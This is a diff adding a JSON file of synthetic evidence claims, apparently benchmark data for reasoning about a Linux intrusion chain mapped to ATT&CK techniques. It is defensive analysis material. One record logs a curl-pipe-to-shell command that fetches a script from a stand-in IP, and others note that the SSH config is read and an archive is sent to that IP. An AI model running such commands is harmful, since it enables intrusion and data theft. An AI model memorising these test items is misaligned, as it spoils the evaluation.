@@ -1,0 +1,506 @@
+[
+  {
+    "claim_id": "C01-EC-001",
+    "case_id": "C01-linux-provenance",
+    "source_type": "cti_text",
+    "claim_type": "cti_behavior",
+    "subject": {
+      "entity_type": "report",
+      "value": "C01 synthetic CTI brief"
+    },
+    "predicate": "describes",
+    "object": {
+      "entity_type": "ttp",
+      "value": "Linux intrusion chain with shell execution, payload drop, C2, collection, and exfiltration"
+    },
+    "mapped_tactic": [
+      "execution",
+      "command-and-control",
+      "collection",
+      "exfiltration"
+    ],
+    "mapped_technique": [
+      "T1059",
+      "T1105",
+      "T1041"
+    ],
+    "evidence_strength": "medium",
+    "confidence": 0.8,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_synthetic_cti_brief",
+      "location": "paragraph 1"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "always_visible",
+      "cti_background"
+    ],
+    "notes": "Task background claim. It is not hidden by ablation."
+  },
+  {
+    "claim_id": "C01-EC-002",
+    "case_id": "C01-linux-provenance",
+    "source_type": "local_log",
+    "claim_type": "process_execution",
+    "subject": {
+      "entity_type": "process",
+      "value": "/bin/bash"
+    },
+    "predicate": "executed",
+    "object": {
+      "entity_type": "command",
+      "value": "curl -fsSL hxxp://198.51.100.77/update.sh | sh"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:02:00Z",
+      "end": "2026-07-01T10:02:20Z",
+      "relative_order": 1
+    },
+    "mapped_tactic": [
+      "execution"
+    ],
+    "mapped_technique": [
+      "T1059"
+    ],
+    "evidence_strength": "strong",
+    "confidence": 0.92,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_linux_audit_log",
+      "record_id": "audit-1002"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:execution",
+      "node:N01_initial_execution"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-003",
+    "case_id": "C01-linux-provenance",
+    "source_type": "provenance_graph",
+    "claim_type": "process_execution",
+    "subject": {
+      "entity_type": "process",
+      "value": "sshd"
+    },
+    "predicate": "spawned",
+    "object": {
+      "entity_type": "process",
+      "value": "/bin/bash"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:01:50Z",
+      "end": "2026-07-01T10:02:05Z",
+      "relative_order": 0
+    },
+    "mapped_tactic": [
+      "execution"
+    ],
+    "mapped_technique": [
+      "T1059"
+    ],
+    "evidence_strength": "medium",
+    "confidence": 0.86,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_provenance_graph",
+      "record_id": "edge-sshd-bash"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:execution",
+      "node:N01_initial_execution"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-004",
+    "case_id": "C01-linux-provenance",
+    "source_type": "provenance_graph",
+    "claim_type": "file_activity",
+    "subject": {
+      "entity_type": "process",
+      "value": "/bin/sh"
+    },
+    "predicate": "wrote",
+    "object": {
+      "entity_type": "file",
+      "value": "/tmp/.cache/upd"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:02:21Z",
+      "end": "2026-07-01T10:02:40Z",
+      "relative_order": 2
+    },
+    "mapped_tactic": [
+      "execution"
+    ],
+    "mapped_technique": [
+      "T1105"
+    ],
+    "evidence_strength": "strong",
+    "confidence": 0.9,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_provenance_graph",
+      "record_id": "edge-shell-upd"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:execution",
+      "node:N02_payload_drop"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-005",
+    "case_id": "C01-linux-provenance",
+    "source_type": "malware_analysis",
+    "claim_type": "malware_behavior",
+    "subject": {
+      "entity_type": "file",
+      "value": "/tmp/.cache/upd"
+    },
+    "predicate": "matched_hash",
+    "object": {
+      "entity_type": "hash",
+      "value": "sha256:9f2c-alpha-demo"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:03:00Z",
+      "end": "2026-07-01T10:05:00Z",
+      "relative_order": 3
+    },
+    "mapped_tactic": [
+      "execution"
+    ],
+    "mapped_technique": [
+      "T1105"
+    ],
+    "evidence_strength": "critical",
+    "confidence": 0.95,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_malware_sandbox",
+      "record_id": "sample-9f2c"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:execution",
+      "node:N02_payload_drop",
+      "critical",
+      "discriminative",
+      "unique"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-006",
+    "case_id": "C01-linux-provenance",
+    "source_type": "local_log",
+    "claim_type": "process_execution",
+    "subject": {
+      "entity_type": "process",
+      "value": "/tmp/.cache/upd"
+    },
+    "predicate": "executed",
+    "object": {
+      "entity_type": "command",
+      "value": "id; uname -a; hostname"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:03:12Z",
+      "end": "2026-07-01T10:03:30Z",
+      "relative_order": 4
+    },
+    "mapped_tactic": [
+      "discovery"
+    ],
+    "mapped_technique": [
+      "T1082"
+    ],
+    "evidence_strength": "medium",
+    "confidence": 0.88,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_linux_audit_log",
+      "record_id": "audit-1011"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:discovery",
+      "node:N03_local_discovery"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-007",
+    "case_id": "C01-linux-provenance",
+    "source_type": "network_summary",
+    "claim_type": "network_connection",
+    "subject": {
+      "entity_type": "process",
+      "value": "/tmp/.cache/upd"
+    },
+    "predicate": "connected_to",
+    "object": {
+      "entity_type": "ip",
+      "value": "198.51.100.77:443"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:03:45Z",
+      "end": "2026-07-01T10:04:20Z",
+      "relative_order": 5
+    },
+    "mapped_tactic": [
+      "command-and-control"
+    ],
+    "mapped_technique": [
+      "T1071"
+    ],
+    "evidence_strength": "critical",
+    "confidence": 0.94,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_netflow",
+      "record_id": "flow-443-77"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:command_and_control",
+      "node:N04_c2_connection",
+      "critical",
+      "discriminative",
+      "unique"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-008",
+    "case_id": "C01-linux-provenance",
+    "source_type": "ioc_enrichment",
+    "claim_type": "infrastructure_relation",
+    "subject": {
+      "entity_type": "ip",
+      "value": "198.51.100.77"
+    },
+    "predicate": "previously_seen_with",
+    "object": {
+      "entity_type": "campaign",
+      "value": "campaign_alpha"
+    },
+    "time_window": {
+      "relative_order": 6
+    },
+    "mapped_tactic": [
+      "command-and-control"
+    ],
+    "mapped_technique": [
+      "T1071"
+    ],
+    "evidence_strength": "critical",
+    "confidence": 0.9,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_ioc_enrichment",
+      "record_id": "ioc-198-51-100-77"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:command_and_control",
+      "node:N04_c2_connection",
+      "critical",
+      "discriminative",
+      "unique"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-009",
+    "case_id": "C01-linux-provenance",
+    "source_type": "provenance_graph",
+    "claim_type": "data_access",
+    "subject": {
+      "entity_type": "process",
+      "value": "/tmp/.cache/upd"
+    },
+    "predicate": "read",
+    "object": {
+      "entity_type": "file",
+      "value": "/home/alice/.ssh/config"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:05:10Z",
+      "end": "2026-07-01T10:05:20Z",
+      "relative_order": 7
+    },
+    "mapped_tactic": [
+      "collection"
+    ],
+    "mapped_technique": [
+      "T1005"
+    ],
+    "evidence_strength": "strong",
+    "confidence": 0.91,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_provenance_graph",
+      "record_id": "edge-upd-sshconfig"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:collection",
+      "node:N05_collection"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-010",
+    "case_id": "C01-linux-provenance",
+    "source_type": "provenance_graph",
+    "claim_type": "file_activity",
+    "subject": {
+      "entity_type": "process",
+      "value": "/tmp/.cache/upd"
+    },
+    "predicate": "wrote",
+    "object": {
+      "entity_type": "file",
+      "value": "/tmp/.cache/archive.tgz"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:05:22Z",
+      "end": "2026-07-01T10:05:40Z",
+      "relative_order": 8
+    },
+    "mapped_tactic": [
+      "collection"
+    ],
+    "mapped_technique": [
+      "T1560"
+    ],
+    "evidence_strength": "critical",
+    "confidence": 0.93,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_provenance_graph",
+      "record_id": "edge-upd-archive"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:collection",
+      "node:N05_collection",
+      "critical",
+      "discriminative"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-011",
+    "case_id": "C01-linux-provenance",
+    "source_type": "network_summary",
+    "claim_type": "exfiltration_activity",
+    "subject": {
+      "entity_type": "file",
+      "value": "/tmp/.cache/archive.tgz"
+    },
+    "predicate": "sent_to",
+    "object": {
+      "entity_type": "ip",
+      "value": "198.51.100.77:443"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:06:00Z",
+      "end": "2026-07-01T10:07:20Z",
+      "relative_order": 9
+    },
+    "mapped_tactic": [
+      "exfiltration"
+    ],
+    "mapped_technique": [
+      "T1041"
+    ],
+    "evidence_strength": "critical",
+    "confidence": 0.95,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_netflow",
+      "record_id": "flow-exfil-443"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:exfiltration",
+      "node:N06_exfiltration",
+      "critical",
+      "discriminative",
+      "unique"
+    ]
+  },
+  {
+    "claim_id": "C01-EC-012",
+    "case_id": "C01-linux-provenance",
+    "source_type": "provenance_graph",
+    "claim_type": "file_activity",
+    "subject": {
+      "entity_type": "process",
+      "value": "/tmp/.cache/upd"
+    },
+    "predicate": "read",
+    "object": {
+      "entity_type": "file",
+      "value": "/tmp/.cache/archive.tgz"
+    },
+    "time_window": {
+      "start": "2026-07-01T10:05:50Z",
+      "end": "2026-07-01T10:06:00Z",
+      "relative_order": 9
+    },
+    "mapped_tactic": [
+      "exfiltration"
+    ],
+    "mapped_technique": [
+      "T1041"
+    ],
+    "evidence_strength": "strong",
+    "confidence": 0.89,
+    "observable_status": "visible",
+    "source_pointer": {
+      "artifact_id": "C01_provenance_graph",
+      "record_id": "edge-upd-read-archive"
+    },
+    "supports_hypotheses": [
+      "campaign_alpha"
+    ],
+    "tags": [
+      "hideable",
+      "stage:exfiltration",
+      "node:N06_exfiltration"
+    ]
+  }
+]
